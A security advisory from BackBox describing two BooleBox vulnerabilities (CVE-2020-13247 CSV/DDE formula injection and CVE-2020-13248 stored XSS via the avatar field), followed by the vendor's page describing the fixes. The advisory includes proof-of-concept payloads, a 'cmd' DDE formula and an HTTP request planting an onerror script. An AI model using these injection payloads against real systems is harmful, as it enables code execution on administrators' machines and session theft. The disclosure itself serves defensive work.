=== Content from members.backbox.org_ebe2f25d_20250119_111529.html ===

[![BackBox.org Membership](data:image/svg+xml...)](https://members.backbox.org/)

* [BackBox.org](https://www.backbox.org)
* [Home](https://members.backbox.org/)
* [Jobs](https://members.backbox.org/jobs/)
* [Partnership](https://members.backbox.org/category/partnership/)
* [Sharing Board](https://members.backbox.org/sharing-board/)
* [Sitemap](https://www.backbox.org/sitemap/)
* [Contact](https://www.backbox.org/contact)
* [Search](?s=)
* **Menu**

  Menu

# BooleBox Secure Sharing, Multiple Vulnerabilities

May 12, 2020/in [Sharing Board](https://members.backbox.org/category/sharing-board/)

# Authors: BackBox Team
# Vendor Homepage: https://www.boolebox.it

**I. INTRODUCTION**

BooleBox is a Secure File Sharing Utility available as a Cloud, On-Premises or Hybrid service. The product offers a wide variety of File Sharing protection mechanisms and also the possibility of cloud online editing and collaboration.

**II. CSV Injection, aka Excel Macro Injection or Formula Injection (CVE-2020-13247)**

The vulnerability exists in the export feature and allows a remote user to inject arbitrary code into CSV files.

The vulnerability exists in the user’s name parameter due to insufficient sanitization of user-supplied data when constructing CSV files. CSV files contain users activity logs and they are exportable from the Audit Area accessible exclusively by privileged users. In order to make the macro executable it should be placed at the beginning of the string so at the place of the user’s name. Any user can modify his/her name and replace it with a malicious macro. The administrator user may export the compromised log file in CSV format and open it with Microsoft Excel. The malicious macro will be executed causing system damage.

***a. Proof of Concept***

Any user can perform the attack against an administrator user who has the privileged functionality of downloading activity logs in CSV format. The attacker should replace his name with a malicious macro in the area *“My account – Personal Data”*.

For example *“John Smith”* becomes *“=cmd|’ /C calc’!A1 Smith”*

Then he/she should perform an action that will be recorded in the activity logs in the form *“[Name Surname] [action]”*.

For example *John Smith* renamed *“file.txt”* in *“file2.txt”* becomes:

```
=cmd|’ /C calc’!A1  Smith renamed “file.txt” in “file2.txt”
```

When the administrator user open the log file with Microsoft Excel the macro will be executed and he/she will be victim of this attack.

**b. *Business Impact***

Arbitrary formulas can be injected into CSV/Excel files. This can potentially lead to remote code execution at the client (DDE) or data leakage via maliciously injected hyperlinks.

**III. Stored XSS Vulnerability (CVE-2020-13248)**

The Web Application is affected by a Stored XSS Vulnerability. If an attacker manages other users to request the Stored XSS parameter, he/she can execute arbitrary JavaScript code within the user’s browser in the context of that user’s session. The attacker-supplied code can perform a wide variety of actions, such as stealing the victim’s session token or login credentials, performing arbitrary actions on the victim’s behalf and logging their keystrokes.
Reference: https://www.owasp.org/index.php/Cross-site\_Scripting\_(XSS)

The vulnerable function seem to require only a basic account access to the platform.

URL affected: hostname/BS/Account.aspx;
Vulnerable parameter: “avatar” json parameter;
Method: POST.

***a. Proof of Concept***

Any user can upload his/her own Profile Image under the My Account section, which is sent to the server as a base64 encoded sequence and embedded elsewhere in an *<img src=”>* HTML tag. Here follows a sample of a valid image uploaded, URL decoded for readability reasons:

```
POST /BS/Account.aspx HTTP/1.1
Host: example.com
        ...
  [HTTP Headers]
        ...

data={"action":3,"name":null,"surname":null,"avatar":"data:image/png;base64,[BASE64 Encoded Image]","inApp":false}
```

However, whenever a user uploads an image that is not base64 encoded, the system considers it valid and copies it internally with minimal if none sanitization or safety checking. As a consequence, when an attacker loads an XSS payload as image body, it is correctly saved in the database.
Here follows the request containing the XSS payload sent to the server.

```
POST /BS/Account.aspx HTTP/1.1
Host: example.com
        ...
   [HTTP Headers]
        ...

data={"action":3,"name":null,"surname":null,"avatar":"\" onerror=\"alert('xss')","inApp":false}
```

Once the payload is set as user’s avatar, it is possible to execute the payload by clicking on the username on the top right of the main web Application page. This will trigger an Ajax request to the backend to retrieve the stored avatar, as shown in the following request example:

```
POST /BS/Account.aspx HTTP/1.1
Host: example.com
       ...
  [HTTP Headers]
       ...

data={"action":1,"getAvatar":true}
```

The response to this request, is the following:

```
HTTP/1.1 200 OK
       ...
  [HTTP Headers]
       ...

{"type":1,"details":{"name":"[NAME]","surname":"[SURNAME]","username":"[USER EMAIL]","phone":null,"avatar":"\" onerror=\"alert('xss')","storage":{"used":0,"total":3221225472,"usedText":"0 KB","totalText":"3 GB"},"last_access":"GG/MM/AAAA HH:MM (AM|PM)"},"subscription":{"type":"BooleBox Business","start":"GG/MM/AAAA","cancelled":false,"renewal":{"date":"No expiry","method":null},"payment":null},"banner":null}
```

The value corresponding to the “avatar” key is then copied client-side inside the box that appears when the request is made:

```
<div id="user_info_box_slider" class="user_info_box_slider" style="display: block; opacity: 1;">
    <div class="userIdentityContainer clearfix">
        <div id="user_area_avatar" class="left">
            <div class="avatarUser"><img class="profileAvatar" src="" onerror="alert('xss')"></div>
        </div>
        ... [OTHER USER DATA DISPLAYED HERE] ...
    </div>
</div>
```

and this will finally execute the XSS payload that has been set as avatar image.

Even more dangerous, any other user with Upload/Write privileges that has the attacker registerd in his/her contact list is affected by this vulnerability. Specifically, when that user navigates to the “Contacts” section and reaches the page where the attacker information is shown the following request is made to the backend.

```
POST /BS/Preview.aspx HTTP/1.1
Host: example.com
       ...
  [HTTP Headers]
       ...

data={"action":47,"users":[{"ID":"[ATTACKER ID]","Name":"[ATTACKER NAME SURNAME]","Username":"attacker@evil.com","Email":"attacker@evil.com","AvatarId":"[AVATAR ID]","Avatar":"","belongGroup":true,"msgRead":null,"Domain":false,"UsersInGroup":null,"DisplayName":""}]}
```

To this request, the backend then answers with the requested Avatar that contains the attacker’s XSS payload.

```
HTTP/1.1 200 OK
       ...
  [HTTP Headers]
       ...

{"Avatar":"\" onerror=\"alert('xss')"}
```

The provided avatar, as for the previous XSS example is then inserted in an IMG HTML tag on the client side inside the dedicated to that user. An example of the output attacker’s is the following:

```
<div class="singleUser clearfix pointer" id="[ATTACKER'S ID]">
  <span class="removeUser pointer icon-elimina"></span>
  <div class="userAvatar left">
    <img src="images/share/BS4_Share_Custom_Flag_S.png" class="shareButtonFlag">
    <img src="" onerror="alert('xss')" width="100%" height="100%"></div>
    <div class="userDataRubrica"><div class="user-icons"></div>
    <div class="userNameRubrica fixTextOverflow" title="[ATTACKER'S DATA]">[ATTACKER'S DATA]</div>
  </div>
</div>
```

***b. Business Impact***

Up to now, we have evidence that the vulnerability interests any user that can upload his/her own avatar (even low privileged ones) and affects, besides himself/herself, any other user that added the attacker in the contact list. To the best of our knowledge, the users that can add people and access to a contact list are also those with Upload/Write privileges on the platform, which makes the Stored XSS even more dangerous.

**IV. SYSTEMS AFFECTED**
Currently we have no detailed information on the system versions affected, potentially all the versions could be vulnerable.

**V. VULNERABILITY HISTORY**
May 12th, 2020: Vendor notification

**VI. LEGAL NOTICES**
The information contained within this advisory is supplied “as-is” with no warranties or guarantees of fitness of use or otherwise. We accept no responsibility for any damage caused by the use or misuse of this information.

##### Share this entry

* [Share on Facebook](https://www.facebook.com/sharer.php?u=https://members.backbox.org/boolebox-secure-sharing-multiple-vulnerabilities/&t=BooleBox%20Secure%20Sharing%2C%20Multiple%20Vulnerabilities)
* [Share on X](https://twitter.com/share?text=BooleBox%20Secure%20Sharing%2C%20Multiple%20Vulnerabilities&url=https://members.backbox.org/?p=1254)
* [Share on Pinterest](https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fmembers.backbox.org%2Fboolebox-secure-sharing-multiple-vulnerabilities%2F&description=BooleBox%20Secure%20Sharing%2C%20Multiple%20Vulnerabilities&media=)
* [Share on LinkedIn](https://linkedin.com/shareArticle?mini=true&title=BooleBox%20Secure%20Sharing%2C%20Multiple%20Vulnerabilities&url=https://members.backbox.org/boolebox-secure-sharing-multiple-vulnerabilities/)
* [Share on Tumblr](https://www.tumblr.com/share/link?url=https%3A%2F%2Fmembers.backbox.org%2Fboolebox-secure-sharing-multiple-vulnerabilities%2F&name=BooleBox%20Secure%20Sharing%2C%20Multiple%20Vulnerabilities&description=%23%20Authors%3A%20BackBox%20Team%23%20Vendor%20Homepage%3A%20https%3A%2F%2Fwww.boolebox.it%20I.%20INTRODUCTION%20BooleBox%20is%20a%20Secure%20File%20Sharing%20Utility%20available%20as%20a%20Cloud%2C%20On-Premises%20or%20Hybrid%20service.%20The%20product%20offers%20a%20wide%20variety%20of%20File%20Sharing%20protection%20mechanisms%20and%20also%20the%20possibility%20of%20cloud%20online%20editing%20and%20collaboration.%20II.%20CSV%20Injection%2C%20aka%20Excel%20Macro%20Injection%20or%20Formula%20Injection%20%5B%E2%80%A6%5D)
* [Share on Vk](https://vk.com/share.php?url=https://members.backbox.org/boolebox-secure-sharing-multiple-vulnerabilities/)
* [Share on Reddit](https://reddit.com/submit?url=https://members.backbox.org/boolebox-secure-sharing-multiple-vulnerabilities/&title=BooleBox%20Secure%20Sharing%2C%20Multiple%20Vulnerabilities)
* Share by Mail
https://www.backbox.org/wp-content/uploads/2018/09/website\_backbox\_text\_black.png
0
0

admin
https://www.backbox.org/wp-content/uploads/2018/09/website\_backbox\_text\_black.png

admin2020-05-12 20:24:082020-05-20 18:19:15BooleBox Secure Sharing, Multiple Vulnerabilities

Copyright © BackBox.org

* [X](https://twitter.com/backbox_org "X")
* [Facebook](https://www.facebook.com/backbox.org/ "Facebook")
* [LinkedIn](https://www.linkedin.com/company/backbox-org/ "LinkedIn")
* [Youtube](https://www.youtube.com/%40backboxlinux-yt "Youtube")
* [Telegram](http://t.me/backbox_org "Telegram")

[ADEngine, Dark Web Monitoring and Data Leak Detection![](data:image/svg+xml...)](https://members.backbox.org/adengine-dark-web-monitoring-and-data-leak-detection/)[FASTGate GPON, Cross Site Request Forgery](https://members.backbox.org/fastgate-gpon-cross-site-request-forgery/)
[Scroll to top](#top "Scroll to top")



=== Content from app.boolebox.com_084c67b1_20250119_111528.html ===

![Boolebox](../images/boolebox-logo.png)
# Boolebox Fixes

Vulnerabilities:

<https://nvd.nist.gov/vuln/detail/CVE-2020-13247>

<https://nvd.nist.gov/vuln/detail/CVE-2020-13248>

## CSV Injection, aka Excel Macro Injection or Formula Injection (CVE-2020-13247)

The vulnerability exists in the export feature and allows a remote user to inject arbitrary code into CSV files.

CSV Injection, aka Excel Macro Injection or Formula Injection (CVE-2020-13247)

"Any user can modify his / her name and replace it with a malicious macro. For example" John Smith "becomes" = cmd | â/ C calcâ! A1 Smith ""
Previously, it was possible to go to the account section and put a command instead of the name. When the administrator went to the dashboard and exported the audit containing the user data, a csv was created, which, if opened with excel, could run the macro written by the user and could potentially be harmful to the pc of the administrator.

**The fix was conducted in two places:**

1. There is a control on the characters inserted in the personal data fields of the user. You can no longer enter any characters, but it is checked by a regular expression that only allows alphabetic characters.
2. There is a control during the audit export. If a potentially dangerous string had already been entered in previous versions, it is no longer reported in the export. The personal data is checked using the same regular expression, and in case of personal data, it is replaced with an "Invalid name" message.

## Stored XSS Vulnerability (CVE-2020-13248)

The Web Application is affected by a Stored XSS Vulnerability

Stored XSS Vulnerability (CVE-2020-13248)

"whenever a user uploads an image that is not base64 encoded, the system considers it valid and copies it internally"
Any user can upload their own Profile Image under the My Account section, which is sent to the server as a base64 encoded sequence and embedded elsewhere.
The Web Application is affected by a Stored XSS Vulnerability. If an attacker manages other users to request the Stored XSS parameter, they can execute arbitrary JavaScript code within the userâs browser in the context of that userâs session.

**The fix was conducted in two places**

1. It is verified that the base64 encoding is actually valid and corresponding to an image
2. When viewing the address book, a "check and sanitization" of the content on the server is performed so that if a malicious script has already been stored, it will no longer be executed when called.


